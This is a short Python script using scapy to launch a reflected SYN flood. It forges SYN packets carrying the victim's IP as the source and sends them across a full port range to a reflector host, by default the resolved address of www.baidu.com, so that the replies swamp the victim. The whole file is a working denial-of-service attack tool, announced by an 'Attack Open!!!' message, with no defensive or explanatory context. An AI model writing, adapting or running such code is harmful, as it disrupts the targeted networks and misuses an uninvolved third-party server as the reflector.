#coding:utf-8
import socket
import re
import threading as th
from scapy.all import *
def synFlood(tgts,Fan=socket.gethostbyname("www.baidu.com"),sPort=80): 
    print("[in]Set reflector IP is %s"%Fan)
    print("[in]Set reflector port is %s"%sPort)
    print("[in]Set target IP(or a domain to IP) List is",tgts)
    print("Attack Open!!!")
    def tempp(tgts,Fan,sPort):
        for tgt in tgts:
            for dPort in range(1024,65535): 
                ipLayer = IP(src=tgt, dst=str(Fan)) 
                tcpLayer = TCP(sport=dPort, dport=sPort,flags="S") 
                packet = ipLayer / tcpLayer 
                send(packet)
                print("%s send port: %d"%(tgt,dPort))
    th.Thread(target=tempp,args=(tgts,Fan,sPort)).start()
def main(ls):
    tl=[]
    for tar in ls:
        if re.search(r"[1-255].[1-255].[1-255].[1-255]", tar) != None:
            tar = socket.gethostbyname(tar)
        tl.append(tar)
    synFlood(tl)